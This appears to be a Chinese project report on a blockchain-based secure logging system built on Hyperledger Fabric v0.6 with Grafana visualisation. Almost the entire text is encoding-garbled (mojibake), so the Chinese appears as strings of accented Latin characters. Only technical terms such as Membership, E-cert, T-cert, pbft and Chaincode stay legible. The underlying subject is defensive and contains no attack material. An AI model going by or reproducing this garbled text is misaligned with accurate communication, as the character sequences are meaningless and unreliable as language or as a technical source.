åŸºäºåŒºå—é“¾æŠ€æœ¯ï¼Œæœ¬é¡¹ç›®è®¾è®¡å¹¶å®ç°äº†å®‰å…¨æ—¥å¿—ç³»ç»Ÿã€‚è¯¥ç³»ç»Ÿé‡‡ç”¨é“¾ä¸Šæ•°æ®å­˜å‚¨æ¨¡å¼ï¼Œå°†æœ¬åœ°æ—¥å¿—ä¸Šä¼ è‡³åŒºå—é“¾ä¸­å­˜å‚¨ï¼ŒåŒæ—¶æä¾›äº†å¯è§†åŒ–ç•Œé¢è®©ç”¨æˆ·èƒ½å¤Ÿä½¿ç”¨æ—¥å¿—ç›¸å…³çš„å®‰å…¨åˆ†æåŠŸèƒ½ã€‚é€šè¿‡å®‰å…¨æ€§åˆ†æè®ºè¯äº†è¯¥ç³»ç»Ÿèƒ½å¤Ÿä¿è¯å®‰å…¨è®¾å¤‡æ—¥å¿—çš„å®‰å…¨å¯é å­˜å‚¨ï¼ŒåŒæ—¶ä¸ºæ—¥å¿—åˆ†æï¼Œæ—¥å¿—å–è¯æä¾›ä¾¿åˆ©ã€‚æœ¬é¡¹ç›®è§£å†³äº†æ—¥å¿—æ˜“è¢«åˆ é™¤ï¼Œç¯¡æ”¹ï¼Œä¼ªé€ ç­‰é—®é¢˜ï¼Œæ»¡è¶³äº†å­¦æ ¡ã€å…¬å¸ç­‰äº‘å­˜å‚¨ç³»ç»Ÿçš„å®‰å…¨æ—¥å¿—å®¡è®¡ï¼Œå¹¶æå¤§çš„æé«˜äº†æ•°æ®å­˜å‚¨çš„å®‰å…¨æ€§ï¼Œå‡è½»è¿ç»´äººå‘˜çš„å‹åŠ›ã€‚ æ¦‚è¿°èƒŒæ™¯äº‘è®¡ç®—å·²ç»è¢«è®¤ä¸ºæ˜¯ä¸‹ä¸€ä»£çš„ä¿¡æ¯æŠ€æœ¯åŸºç¡€è®¾æ–½ï¼Œå› ä¸ºå®ƒåœ¨ä¿¡æ¯æŠ€æœ¯çš„å‘å±•å²ä¸Šæœ‰ç€å²æ— å‰ä¾‹çš„ä¼˜åŠ¿ï¼šè‡ªåŠ©æŒ‰éœ€æœåŠ¡ï¼Œéšæ—¶éšåœ°åœ°è¿›è¡Œç½‘ç»œè®¿é—®ï¼Œä½ç½®ç‹¬ç«‹çš„èµ„æºæ± ã€å¼¹æ€§èµ„æºï¼ŒåŸºäºä½¿ç”¨çš„è®¡è´¹ä»¥åŠé£é™©è½¬ç§»ã€‚ä½œä¸ºä¸€é¡¹å…·æœ‰æ·±è¿œå½±å“çš„é¢ è¦†æ€§æŠ€æœ¯ï¼Œäº‘è®¡ç®—æ­£åœ¨æ”¹å˜ä¼ä¸šä½¿ç”¨ä¿¡æ¯æŠ€æœ¯çš„æ¨¡å¼ï¼Œä¸€ä¸ªå…¸å‹çš„æ–¹é¢æ˜¯æ•°æ®æ­£åœ¨è¢«é›†ä¸­å¤–åŒ…ç»™äº‘ã€‚ä»ç”¨æˆ·è§’åº¦æ¥çœ‹ï¼ŒåŒ…æ‹¬ä¸ªäººå’Œä¼ä¸šç”¨æˆ·ï¼Œå°†æ•°æ®çµæ´»çš„ä»¥æŒ‰éœ€åˆ†é…çš„æ–¹å¼å­˜å‚¨åˆ°äº‘ç«¯å¸¦æ¥äº†æœ‰å¸å¼•åŠ›çš„å¥½å¤„ï¼šç¼“è§£äº†å­˜å‚¨ç®¡ç†è´Ÿæ‹…ï¼Œå‡å°‘äº†åœ¨ç¡¬ä»¶ã€è½¯ä»¶ä»¥åŠç»´æŠ¤äººå‘˜ä¸Šçš„èŠ±é”€ã€‚äº‘å­˜å‚¨çš„æ¦‚å¿µæ­£æ˜¯ä»äº‘è®¡ç®—å¼•ç”³è€Œæ¥çš„ï¼Œå®ƒæ˜¯ä¸€ç§é€šè¿‡å°†ç½‘ç»œä¸­ä¸åŒçš„å­˜å‚¨è®¾å¤‡åˆ©ç”¨åˆ†å¸ƒå¼å’Œé›†ç¾¤æŠ€æœ¯ç»„åˆèµ·æ¥ååŒå·¥ä½œçš„æ–°å‹å­˜å‚¨æŠ€æœ¯ï¼Œå¹¶èƒ½å¤Ÿå¯¹å¤–æä¾›å¤§é‡æ•°æ®çš„å­˜å‚¨æœåŠ¡ä»¥åŠä¸šåŠ¡è®¿é—®æœåŠ¡ã€‚æ—¥å¿—å³ä¸ºä¸€ç§äº‘å­˜å‚¨çš„æ–¹å¼ã€‚ç”¨æˆ·é€šè¿‡URLè¯·æ±‚ç‰¹å®šåŸŸåä¸‹çš„èµ„æºï¼Œè¿™äº›èµ„æºä¼šè¢«ä¿å­˜åœ¨ç‰¹å®šæœåŠ¡å™¨ä¸Šï¼ŒWebæœåŠ¡å™¨åœ¨å“åº”ç”¨æˆ·è¯·æ±‚çš„åŒæ—¶å¯ä»¥ä»¥æ—¥å¿—æ–‡ä»¶è®°å½•ç”¨æˆ·è¯·æ±‚çš„å…¨è¿‡ç¨‹ï¼Œå³Webæ—¥å¿—ã€‚æ—¥å¿—å‡ ä¹å†…å»ºäºæ‰€æœ‰çš„ç³»ç»Ÿä¸­ï¼Œå®ƒè¢«ç”¨äºè®°å½•ç³»ç»Ÿè¿è¡Œæ—¶äº§ç”Ÿçš„ä¿¡æ¯ï¼Œå¦‚æ—¥å¸¸æ“ä½œã€ç½‘ç»œè®¿é—®ã€ç³»ç»Ÿè­¦å‘Šç­‰äº‹ä»¶çš„ç›¸å…³å±æ€§å’Œä¿¡æ¯ã€‚ éšç€äº’è”ç½‘çš„è¿…é€Ÿå‘å±•ï¼Œè®¡ç®—æœºç³»ç»Ÿä»é˜²ç«å¢™ã€æ•°å­—åŠ å¯†ã€èº«ä»½è®¤è¯ã€è®¿é—®æ§åˆ¶ã€æ•°å­—ç­¾åæŠ€æœ¯ç­‰æ–¹é¢åŠ å¼ºå®‰å…¨ç»´æŠ¤ï¼Œä½†ä»å­˜åœ¨è¢«éæˆæƒç”¨æˆ·æ”»å‡»çš„é£é™©ã€‚æ—¥å¿—ç»å¸¸æ˜¯å…¥ä¾µè€…çš„ä¸»è¦æ”»å‡»ç›®æ ‡ï¼Œå®¹æ˜“å—åˆ°ç¯¡æ”¹ã€åˆ é™¤ã€ä¼ªé€ ç­‰ç ´åã€‚å­˜å‚¨å®‰å…¨æ˜¯æ•°æ®å®‰å…¨çš„å…³é”®ã€‚å› æ­¤ï¼Œå»ºç«‹å®‰å…¨çš„æ—¥å¿—ç³»ç»Ÿæ˜¯éå¸¸å¿…è¦çš„ã€‚ åŒºå—é“¾æŠ€æœ¯çš„å‘å±•ï¼Œä¸ºå®ç°æ—¥å¿—ä¿¡æ¯çš„ä¿æŠ¤ã€åˆ†äº«ã€å¤šè¾¹åˆ©ç›Šæœ€å¤§åŒ–æä¾›äº†å¯èƒ½ï¼Œä¸ºå®ç°å®‰å…¨æ—¥å¿—ç³»ç»Ÿæä¾›äº†ä¿éšœã€‚åŒºå—é“¾æŠ€æœ¯å…·æœ‰å»ä¸­å¿ƒåŒ–ã€ä¸å¯ç¯¡æ”¹å’Œè¿½è¸ªæº¯æºç­‰ç‰¹æ€§ï¼Œå…¶åº”ç”¨åœºæ™¯å·²æ¶‰åŠåŒ»ç–—ã€ç”µç½‘ã€å†œäº§å“è¿½æº¯æ–¹å‘ã€‚åŒºå—é“¾å°†ä¿¡ä»»å…³ç³»ä»ä¸­å¿ƒåŒ–çš„æœºæ„è½¬ç§»åˆ°æ‰€æœ‰å‚ä¸è®¡ç®—çš„ä¸ªä½“ä¸Šï¼Œä¸€æ—¦æŸä¸ªäº¤æ˜“è¢«ç¯¡æ”¹ï¼ŒåŒºå—é“¾ç½‘ç»œä¸­çš„èŠ‚ç‚¹ä¼šæ£€æµ‹å‡ºè¯¥è¡Œä¸ºï¼Œåªæœ‰å¤šä¸ªèŠ‚ç‚¹åŒæ—¶é­å—æ”»å‡»æ—¶æ‰ä¼šé¢ä¸´æ•°æ®çš„ä¸¢å¤±å’Œæ³„éœ²ç­‰é£é™©ï¼Œä»è€Œå¯ä»¥é˜²æ­¢æ•°æ®æ³„éœ²ã€åˆè°‹æ”»å‡»ã€ä¼ªé€ ç­‰ä¸è‰¯è¡Œä¸ºã€‚ ç‰¹è‰²æè¿°ç›®å‰ï¼ŒåŒºå—é“¾å’Œæ—¥å¿—æœåŠ¡ç³»ç»Ÿå­˜åœ¨ä»¥ä¸‹åŒ¹é…æˆ–çŸ›ç›¾çš„åœ°æ–¹ï¼š åŒºå—é“¾æœ‰å¤šä¸ªå‰¯æœ¬ï¼Œæœ‰åŠ©äºæ—¥å¿—çš„ä¿å­˜ï¼› å…±è¯†æœºåˆ¶ç¼“æ…¢ä¸åˆ©äºæ—¥å¿—çš„ä¿å­˜ï¼› å…±è¯†æœºåˆ¶å¯ä¿éšœæ—¥å¿—çš„å…ˆåé¡ºåºä¸è¢«æ‰“ä¹±ï¼› å…·æœ‰å¯è¿½æº¯æ€§ï¼Œæ¯ä¸ªæ—¥å¿—éƒ½æœ‰æ•°å­—ç­¾åï¼Œå¯ä»¥æ˜ç¡®æŸ¥åˆ°æäº¤è€…ï¼› åŒºå—é“¾èŠ‚ç‚¹æ•°é‡å°‘æ—¶å®‰å…¨æ€§é™ä½ï¼› ç”±äºæ¯ä¸ªèŠ‚ç‚¹éƒ½ä¿å­˜æ—¥å¿—çš„å®Œæ•´ç‰ˆæœ¬ï¼Œå¯¹å­˜å‚¨ç©ºé—´æ¶ˆè€—å¤§ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬å¯¹æœ¬é¡¹ç›®è¿›è¡Œäº†ç³»ç»Ÿæ€§åˆ†æã€è§„åˆ’ï¼Œä»¥ä¸‹ä¸ºè¯¥é¡¹ç›®çš„ç‰¹ç‚¹ï¼š åˆ†å¸ƒå¼å­˜å‚¨å¤šä¸ªå‰¯æœ¬ï¼› çµæ´»æ”¯æŒå¤šç§æ—¥å¿—æ ¼å¼ï¼Œä¾¿äºç¨‹åºåŒ–åˆ†æï¼› é¡ºåºæ€§æœ‰ä¿éšœï¼› é˜²ç¯¡æ”¹ï¼› å¤šæ–¹ç­¾åé˜²æ—¥å¿—ä¼ªé€ ï¼› æœºå™¨ä½¿ç”¨å¯ä¿¡æ ¹ä½œä¸ºä¿¡ä»»åŸºï¼› æ—¥å¿—å­˜å‚¨å‡†ç¡®ç‡é«˜ï¼› æä¾›å¯è§†åŒ–ç•Œé¢ï¼Œæ–¹ä¾¿æŸ¥çœ‹ã€‚ å‰æ™¯åˆ†æåŒºå—é“¾å› ä¸ºæ¯”ç‰¹å¸çš„çš„å‡ºç°ä¸ºäººä»¬æ‰€ç†ŸçŸ¥ï¼Œä»äº§ç”Ÿè¿„ä»Šï¼Œåœ¨é‡‘èã€è¯åˆ¸ã€èµ„æœ¬å’Œç§‘æŠ€è¡Œä¸šçš„åº”ç”¨å‘ˆç°å‡ºçˆ†å‘å¼å¢é•¿ã€‚è™½ç„¶æ¯”ç‰¹å¸æ˜¯åŒºå—é“¾æœ€è‘—åçš„åº”ç”¨ï¼Œä½†åŒºå—é“¾å¯ä»¥åº”ç”¨äºè¿œä¸æ­¢åŠ å¯†è´§å¸çš„å„ç§åº”ç”¨ã€‚ç”±äºå®ƒå¯ä»¥åœ¨æ²¡æœ‰é“¶è¡Œæˆ–ä»»ä½•ç¬¬ä¸‰æ–¹å¯ä¿¡ä¸­é—´æœºæ„çš„æƒ…å†µä¸‹åœ¨åŒæ–¹ä¹‹é—´å®Œæˆæ”¯ä»˜ï¼ŒåŒºå—é“¾å¯ä»¥åº”ç”¨äºæ•°å­—èµ„äº§ã€æ±‡æ¬¾ä»¥åŠåœ¨çº¿æ”¯ä»˜ç­‰å„ç§é‡‘èæœåŠ¡ã€‚æ­¤å¤–ï¼Œæ„å»ºäºåŒºå—é“¾æŠ€æœ¯ä¹‹ä¸Šçš„å„ç§åº”ç”¨ï¼Œä¾‹å¦‚æ™ºèƒ½åˆçº¦åº”ç”¨ã€ç‰©è”ç½‘å’Œå®‰å…¨æœåŠ¡ç­‰ï¼Œä¹Ÿæ­£åœ¨æˆä¸ºæ„å»ºä¸‹ä¸€ä»£äº’è”ç½‘åº”ç”¨æœ€æœ‰å‰æ™¯çš„æŠ€æœ¯ä¹‹ä¸€ã€‚ åŒºå—é“¾æŠ€æœ¯çš„å‡ºç°ä¹Ÿä¸ºäº‘å­˜å‚¨å®‰å…¨çš„ç ”ç©¶æä¾›äº†ä¸€ç§æ–°çš„ç ”ç©¶æ€è·¯ã€‚å› ä¸ºåœ¨ç°å®ç¯å¢ƒä¸­ï¼Œå®Œå…¨å…¬å¹³å…¬å¼€çš„ç¬¬ä¸‰æ–¹æœºæ„æ˜¯ä¸å¯èƒ½çš„ï¼Œä¸”å­˜åœ¨å¤šä¸ªå‚ä¸æ–¹å…±è°‹æ”»å‡»æˆ–è€…æ¬ºéª—å¦ä¸€æ–¹çš„é—®é¢˜ã€‚åŒºå—é“¾æŠ€æœ¯å»ä¸­å¿ƒåŒ–çš„åˆ†å¸ƒå¼æ¶æ„å’Œå»ä¿¡ä»»åŒ–çš„è¿è¡Œæœºåˆ¶ä½¿å¾—å»ºç«‹ä¸€ä¸ªä¸ä¾èµ–äºå¯ä¿¡ç¬¬ä¸‰æ–¹çš„å»ä¸­å¿ƒåŒ–å®¡è®¡æ¶æ„æˆä¸ºå¯èƒ½ã€‚åŒºå—é“¾ä¸­æ¯ä¸ªåŒºå—çš„æ•°æ®ä»¥æ—¶é—´é¡ºåºåŠ å¯†å­˜æ”¾ï¼Œå…·æœ‰å”¯ä¸€æ€§ã€‚å€˜è‹¥ç¯¡æ”¹å…¶ä¸­æŸåŒºå—çš„æ•°æ®ï¼Œä»ç†è®ºä¸Šæ¥è¯´å…¶è®¡ç®—å¼€é”€æ˜¯ç›¸å½“å·¨å¤§çš„ï¼Œè€Œä¸”ä¿®æ”¹æ˜¯ä¸å¯é€†çš„ï¼Œè¿™æ ·å°±åˆ¶çº¦äº†æœåŠ¡å•†éšæ„ç¯¡æ”¹æ•°æ®çš„è¡Œä¸ºã€‚åŒºå—é“¾æŠ€æœ¯çš„å»ä¸­å¿ƒåŒ–å­˜å‚¨æ¶æ„ï¼Œåªæœ‰åŒºå—é“¾ç½‘ç»œä¸­çš„å¤šä¸ªå¯¹ç­‰èŠ‚ç‚¹åŒæ—¶é­å—æ”»å‡»æ—¶æ‰ä¼šé¢ä¸´æ•°æ®çš„ä¸¢å¤±å’Œæ³„éœ²ç­‰é£é™©ï¼Œä»è€Œå¯ä»¥é˜²æ­¢æ•°æ®æ³„éœ²ç­‰å±é™©ã€‚ ä¼´éšç€é«˜çº§æŒç»­å¨èƒæ”»å‡»çš„å¤æ‚å¤šå˜ï¼Œå®‰å…¨æŠ€æœ¯ã€äº§å“ä¸æ–­æ¨é™ˆå‡ºæ–°ï¼Œå®‰å…¨å‚å•†æ¨å‡ºçš„é˜²ç«å¢™ã€ç½‘ç»œå…¥ä¾µæ£€æµ‹ã€ç½‘ç»œå…¥ä¾µé˜²å¾¡ã€èœœç½ã€ä¸Šç½‘è¡Œä¸ºç®¡ç†ã€å®‰å…¨å®¡è®¡ã€ç½‘ç»œæµé‡åˆ†æç­‰ä¼—å¤šäº§å“æ¶µç›–åˆ°äº†ç½‘ç»œå®‰å…¨ã€ä¸»æœºå®‰å…¨ã€Webå®‰å…¨ã€æ•°æ®å®‰å…¨ã€ç§»åŠ¨å®‰å…¨ã€å®‰å…¨ç®¡ç†ã€å·¥æ§å®‰å…¨ç­‰å„ä¸ªæ–¹é¢ï¼ŒåŒæ—¶ä¹Ÿå°±æ˜¯å› ä¸ºäº§å“å¤šæ ·ã€æŠ€æœ¯å¤šå˜ï¼Œå¯¼è‡´å®‰å…¨ä¿¡æ¯æ— æ³•æ•´åˆã€é«˜æ•ˆåˆ©ç”¨ã€‚å¸¸è§çš„æ—¥å¿—æœåŠ¡å™¨è™½ç„¶å®ç°äº†ç³»ç»Ÿç›¸å…³ä¿¡æ¯çš„å­˜å‚¨ï¼Œä¸èƒ½ä¿è¯æ—¥å¿—çš„å®‰å…¨é—®é¢˜ã€‚åŠ å¼ºWebç½‘ç«™çš„ç½‘ç»œå’Œä¿¡æ¯å®‰å…¨ï¼Œä»éœ€ä¸€ç§å®‰å…¨çš„æ—¥å¿—ç³»ç»Ÿã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒåŸºäºåŒºå—é“¾çš„å®‰å…¨æ—¥å¿—ç³»ç»Ÿå°±ä¸ºè§£å†³é—®é¢˜æä¾›äº†å¯èƒ½ã€‚è¯¥é¡¹ç›®é€šè¿‡ç»“åˆåŒºå—é“¾æŠ€æœ¯ï¼Œè®¾è®¡é“¾ä¸Šæ•°æ®å­˜å‚¨æ¨¡å¼ï¼Œæœ‰æ•ˆåœ°è§£å†³äº†æ—¥å¿—æ–‡ä»¶æ˜“è¢«ç¯¡æ”¹çš„é—®é¢˜ï¼ŒåŒæ—¶æä¾›äº†å¯è§†åŒ–ç•Œé¢è®©ç”¨æˆ·èƒ½å¤Ÿä½¿ç”¨æ—¥å¿—ç›¸å…³çš„å®‰å…¨åˆ†æåŠŸèƒ½ã€‚ æœ¬é¡¹ç›®çš„é’ˆå¯¹èŒƒå›´æ˜¯æä¾›WebæœåŠ¡çš„ä¸­å°ä¼ä¸šï¼Œå®ƒä»¬å†…éƒ¨ç»´æŠ¤æœ‰å¤§é‡æœåŠ¡å™¨ï¼Œæ¯å¤©éœ€è¦äº§ç”Ÿå¤§é‡çš„æ—¥å¿—ï¼Œæ€æ ·åˆç†åœ°å¯¹æ—¥å¿—è¿›è¡Œåˆ†æï¼ŒæŠ“ä½é‡ç‚¹ï¼Œåœ¨æ—¥å¿—ä¸­æ‰¾åˆ°å…¥ä¾µæˆ–è€…éå¸¸è§„è¯·æ±‚çš„æ“ä½œï¼Œè§£å†³æ½œåœ¨çš„Webå®‰å…¨é—®é¢˜ï¼Œå¯¹äºæœ‰å¤§é‡WebæœåŠ¡å™¨çš„å…¬å¸æ¥è¯´ï¼Œå¼€å‘ä¸€å¥—å®‰å…¨çš„æ—¥å¿—ç³»ç»Ÿå°±æ˜¾å¾—å°¤ä¸ºé‡è¦ï¼Œè¿™æ ·ä¸ä»…å¢å¼ºäº†ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œæ›´æ˜“äºæœåŠ¡å™¨çš„ç»´æŠ¤ã€‚ è®¾è®¡ä¸å®ç°æ•´ä½“è®¾è®¡åŠŸèƒ½è®¾è®¡æœ¬é¡¹ç›®è®¾è®¡å¹¶å®ç°äº†åŸºäºåŒºå—é“¾çš„å®‰å…¨æ—¥å¿—ç³»ç»Ÿã€‚è¯¥ç³»ç»Ÿå…±æœ‰ä¸‰ä¸ªæ¨¡å—ï¼šæ—¥å¿—æ”¶é›†æ¨¡å—ï¼Œæ—¥å¿—å­˜å‚¨æ¨¡å—ï¼Œæ—¥å¿—åˆ†æå±•ç¤ºæ¨¡å—ã€‚æ—¥å¿—æ”¶é›†æ¨¡å—æä¾›æ—¥å¿—è¿‡æ»¤ï¼Œå…³é”®å­—æå–å’Œæ—¥å¿—å‘é€çš„åŠŸèƒ½ï¼Œæ”¯æŒå¤„ç†ä»»æ„æ ¼å¼æ—¥å¿—ã€‚å¯¹äºæ—¥å¿—å­˜å‚¨æ¨¡å—ï¼Œæˆ‘ä»¬åŸºäºfabric v0.6åŒºå—é“¾å®ç°æ—¥å¿—æ¥æ”¶ï¼Œå®‰å…¨å­˜å‚¨ä¸æŸ¥è¯¢åŠŸèƒ½ã€‚åŒæ—¶æˆ‘ä»¬åˆ©ç”¨grafanaæ•°æ®å¯è§†åŒ–å·¥å…·ä¸åŒºå—é“¾è¿›è¡Œå¯¹æ¥ï¼Œå®ç°æ—¥å¿—å¯è§†åŒ–åˆ†æåŠŸèƒ½ã€‚åœ¨å„ä¸ªæ¨¡å—çš„æ•°æ®ä¼ è¾“ä¸­ï¼Œä¼šå¯¹æ•°æ®è¿›è¡Œç­¾åæ¥è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä»¥é˜²æ—¥å¿—ä¼ªé€ ç­‰é—®é¢˜ã€‚ æ•´ä¸ªé¡¹ç›®çš„åŠŸèƒ½è®¾è®¡å›¾å¦‚ä¸‹ï¼š ç¡¬ä»¶æ‹“æ‰‘è®¾è®¡æœ¬é¡¹ç›®çš„æ•´ä½“æ¡†æ¶æ˜¯åœ¨å„ä¸ªäº§ç”Ÿæ—¥å¿—çš„webæœåŠ¡å™¨ä¸Šéƒ¨ç½²æ—¥å¿—æ”¶é›†æ¨¡å—æ¥è·å–æ—¥å¿—ï¼Œå°†æ—¥å¿—å‘é€åˆ°åŒºå—é“¾ï¼Œå„èŠ‚ç‚¹è¿›è¡Œå…±è¯†åå­˜å‚¨ã€‚ç„¶ågrafanaä»åŒºå—é“¾ä¸­è¯»å–æ—¥å¿—æ•°æ®ï¼Œè¿›è¡Œå¯è§†åŒ–åˆ†æä¸å±•ç¤ºã€‚æ•´ä¸ªç³»ç»Ÿçš„ç¡¬ä»¶æ‹“æ‰‘å›¾å¦‚ä¸‹ï¼š å…·ä½“æµç¨‹è®¾è®¡æ—¥å¿—æ”¶é›†æ¨¡å—è®¾è®¡æ—¥å¿—æ”¶é›†æ¨¡å—å®‰è£…äºå„ä¸ªäº§ç”Ÿæ—¥å¿—çš„æœåŠ¡å™¨ä¸Šï¼Œè¿ç»´äººå‘˜é€šè¿‡HTTP APIçš„æ–¹å¼è¿›è¡Œæ—¥å¿—æ”¶é›†ä»»åŠ¡ç®¡ç†ã€æ›´æ–°ï¼Œè„±ç¦»é…ç½®æ–‡ä»¶ã€‚æ—¥å¿—æ”¶é›†æ¨¡å—æ¥æ”¶åˆ°ä»»åŠ¡åï¼Œå¯¹æŒ‡å®šçš„æ—¥å¿—æ–‡ä»¶è¿›è¡ŒæŒ‰è¡Œè¯»å–ï¼Œç­‰å¾…è¯»å–è‡³100æ¡ï¼ˆé»˜è®¤å€¼ï¼Œå¯è‡ªå®šä¹‰ä¿®æ”¹ï¼‰æ—¶ï¼Œå°†æ—¥å¿—æ‰“åŒ…æ ¹æ®ä»»åŠ¡å†…å®¹è¿›è¡Œè¿‡æ»¤ä¸å…³é”®å­—æ®µæå–ï¼Œæœ€åå‘é€è‡³åŒºå—é“¾ã€‚ å·¥ä½œæµç¨‹å¦‚ä¸‹ï¼š åŒºå—é“¾å­˜å‚¨æ¨¡å—è®¾è®¡åŒºå—é“¾å­˜å‚¨æ¨¡å—æ˜¯åœ¨ hyperledger fabricv0.6 çš„åŸºç¡€ä¸Šæ”¹å†™æ™ºèƒ½åˆçº¦å®ç°çš„ï¼Œæä¾› RESTFUL API è¿›è¡Œæ—¥å¿—æ¥æ”¶ï¼ŒæŸ¥è¯¢æ—¥å¿—åŠŸèƒ½ã€‚ åœ¨Fabric v0.6ç‰ˆæœ¬ä¸­ï¼Œä¸»è¦åˆ†ä¸ºMembershipã€Consensusã€Chaincodeã€Ledgerã€P2Pã€Event Streamç­‰æ ¸å¿ƒæ¨¡å—ã€‚ Membershipï¼šè´Ÿè´£ç­¾å‘ç›¸åº”çš„E-certã€T-certã€TLS-certç­‰è¯ä¹¦ã€‚ä¼šå‘˜æ³¨å†Œã€â¾èº«ä»½ä¿æŠ¤ã€ å†…å®¹ä¿å¯†ã€äº¤æ˜“å®¡è®¡åŠŸ èƒ½ï¼Œä»¥ä¿è¯å¹³å°è®¿é—®çš„å®‰å…¨æ€§ã€‚ Consensusï¼šè´Ÿè´£æ•´ä¸ªåŒºå—é“¾çš„å…±è¯†ï¼Œç»Ÿä¸€äº¤æ˜“é¡ºåºï¼Œä¿è¯åŒºå—é“¾çš„ä¸€è‡´æ€§ã€‚ Chaincodeï¼šå³é“¾ç ï¼ˆFabricä¸­çš„æ™ºèƒ½åˆçº¦ï¼‰ï¼Œç”¨äºæ‰§è¡ŒåŒºå—é“¾ç½‘ç»œä¸­çš„äº¤æ˜“ã€‚ Ledgerï¼šç”¨äºå­˜å‚¨Transaction logä»¥åŠäº¤æ˜“ä¸­çš„Key-Valueã€‚ P2Pï¼šåŸºäºGoogleçš„Grpcæ¡†æ¶çš„åº•å±‚ç½‘ç»œé€šä¿¡å±‚ã€‚ Event Streamï¼šäº‹ä»¶è®¢é˜…å‘å¸ƒç»„å»ºï¼Œç”¨äºæ¥æ”¶äº¤æ˜“åŠåŒºå—äº‹ä»¶ã€‚è´¯ç©¿äºå…¶ä»–å„ä¸ªç»„ä»¶ä¸­é—´ï¼Œä¸ºå„ä¸ªç»„ä»¶é—´çš„å¼‚æ­¥é€šä¿¡æä¾›äº†æŠ€æœ¯å®ç° åŒºå—æœåŠ¡ï¼ˆBlockchain Servicesï¼‰ï¼šè´Ÿè´£èŠ‚ç‚¹é—´çš„å…±è¯†ç®¡ç†ã€è´¦æœ¬çš„åˆ†å¸ƒå¼è®¡ç®—ã€è´¦æœ¬çš„å­˜å‚¨ä»¥åŠèŠ‚ ç‚¹é—´çš„P2Påè®®åŠŸèƒ½çš„å®ç°ï¼Œæ˜¯åŒºå—é“¾çš„æ ¸â¼¼å¿ƒç»„æˆéƒ¨åˆ†ï¼Œä¸ºåŒºå— é“¾çš„ä¸»ä½“åŠŸèƒ½æä¾›äº†åº•å±‚â½€æ’‘ã€‚ Fabric v0.6ç‰ˆæœ¬çš„æ¶æ„å›¾å¦‚ä¸‹ï¼š hyperledger fabricv0.6ä½¿ç”¨pbft (Practical Byzantine Fault Tolerance,å®ç”¨æ‹œå åº­å®¹é”™ç®—æ³•)ä½œä¸ºå…±è¯†ç®—æ³•ï¼Œå¯ä»¥åœ¨ä¿¡ä»»ç¨‹åº¦è¾ƒä½çš„åœºæ™¯ä¸‹é¿å…æ‹œå åº­é—®é¢˜ã€‚åœ¨3f+1ä¸ªå…±è¯†èŠ‚ç‚¹ä¸­èƒ½å¿å—fä¸ªèŠ‚ç‚¹å‡ºé”™ä¸”ä¾ç„¶èƒ½å®ç°æ­£ç¡®å…±è¯†ï¼Œæé«˜ç°å®ä½¿ç”¨ä¸­çš„å®¹é”™ç‡ï¼Œå¢å¼ºå®ç”¨æ€§ã€‚ ä¸‹å›¾ä¸ºFabric v0.6çš„è¿è¡Œæµç¨‹å›¾ï¼š æ—¥å¿—æ”¶é›†æ¨¡å—éœ€è¦å…ˆå‘Membershipç”³è¯·E-certï¼Œé€šè¿‡E-certå»ç”³è¯·T-certï¼Œç”±T-certå¯¹åº”çš„ç§é’¥è¿›è¡Œç­¾åæ—¥å¿—å‘é€è‡³VPèŠ‚ç‚¹è¿›è¡Œä¸‰é˜¶æ®µå…±è¯†ï¼Œå®Œæˆä¹‹åå„ä¸ªèŠ‚ç‚¹ä¼šé€šè¿‡ChaincodeæŒ‰é¡ºåºæ‰§è¡ŒåŒºå—ä¸­çš„äº¤æ˜“ï¼Œå¹¶æ›´æ–°è´¦æœ¬ã€‚ å¯è§†åŒ–åˆ†ææ¨¡å—è®¾è®¡å¯è§†åŒ–åˆ†ææ¨¡å—åŸºäºgrafanaå®ç°ã€‚æˆ‘ä»¬å¼€å‘grafanaçš„æ’ä»¶ï¼Œä½¿å…¶èƒ½å¤Ÿä»åŒºå—é“¾ä¸­è¯»å–æ—¥å¿—å¹¶è¿›è¡Œå¯è§†åŒ–åˆ†æã€‚ Grafanaæ˜¯ä¸€æ¬¾ç”¨Goè¯­è¨€å¼€å‘çš„å¼€æºæ•°æ®å¯è§†åŒ–å·¥å…·ï¼Œå¯ä»¥åšæ•°æ®ç›‘æ§å’Œæ•°æ®ç»Ÿè®¡ã€‚Grafanaå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š å¯è§†åŒ–ï¼šå¿«é€Ÿå’Œçµæ´»çš„å®¢æˆ·ç«¯å›¾å½¢å…·æœ‰å¤šç§é€‰é¡¹ã€‚é¢æ¿æ’ä»¶ä¸ºè®¸å¤šä¸åŒçš„æ–¹å¼å¯è§†åŒ–æŒ‡æ ‡å’Œæ—¥å¿—ã€‚ æŠ¥è­¦ï¼šå¯è§†åŒ–åœ°ä¸ºæœ€é‡è¦çš„æŒ‡æ ‡å®šä¹‰è­¦æŠ¥è§„åˆ™ã€‚Grafanaå°†æŒç»­è¯„ä¼°å®ƒä»¬ï¼Œå¹¶å‘é€é€šçŸ¥ã€‚ é€šçŸ¥ï¼šè­¦æŠ¥æ›´æ”¹çŠ¶æ€æ—¶ï¼Œå®ƒä¼šå‘å‡ºé€šçŸ¥ã€‚æ¥æ”¶ç”µå­é‚®ä»¶é€šçŸ¥ã€‚ åŠ¨æ€ä»ªè¡¨ç›˜ï¼šä½¿ç”¨æ¨¡æ¿å˜é‡åˆ›å»ºåŠ¨æ€å’Œå¯é‡ç”¨çš„ä»ªè¡¨æ¿ï¼Œè¿™äº›æ¨¡æ¿å˜é‡ä½œä¸ºä¸‹æ‹‰èœå•å‡ºç°åœ¨ä»ªè¡¨æ¿é¡¶éƒ¨ã€‚ æ··åˆæ•°æ®æºï¼šåœ¨åŒä¸€ä¸ªå›¾ä¸­æ··åˆä¸åŒçš„æ•°æ®æº!å¯ä»¥æ ¹æ®æ¯ä¸ªæŸ¥è¯¢æŒ‡å®šæ•°æ®æºã€‚è¿™ç”šè‡³é€‚ç”¨äºè‡ªå®šä¹‰æ•°æ®æºã€‚ æ³¨é‡Šï¼šæ³¨é‡Šæ¥è‡ªä¸åŒæ•°æ®æºå›¾è¡¨ã€‚å°†é¼ æ ‡æ‚¬åœåœ¨äº‹ä»¶ä¸Šå¯ä»¥æ˜¾ç¤ºå®Œæ•´çš„äº‹ä»¶å…ƒæ•°æ®å’Œæ ‡è®°ã€‚ 